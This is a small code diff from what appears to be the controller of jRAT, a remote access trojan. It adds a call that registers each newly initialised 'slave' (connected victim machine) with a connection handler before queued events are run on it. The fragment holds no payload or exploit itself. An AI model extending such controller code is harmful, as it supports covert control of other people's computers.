@@ -16,6 +16,7 @@ import se.jrat.client.addons.Plugin;
 import se.jrat.client.addons.PluginLoader;
 import se.jrat.client.events.Event;
 import se.jrat.client.events.Events;
+import se.jrat.client.net.ConnectionHandler;
 import se.jrat.client.packets.outgoing.Packet101TransferPlugin;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.settings.StatisticsOperatingSystem;
@@ -25,6 +26,8 @@ public class Packet3Initialized extends AbstractIncomingPacket {
 
 	@Override
 	public void read(final Slave slave, DataInputStream dis) throws Exception {
+		ConnectionHandler.addSlave(slave);
+
 		for (Event event : Events.queue.values()) {
 			event.perform(slave);
 		}
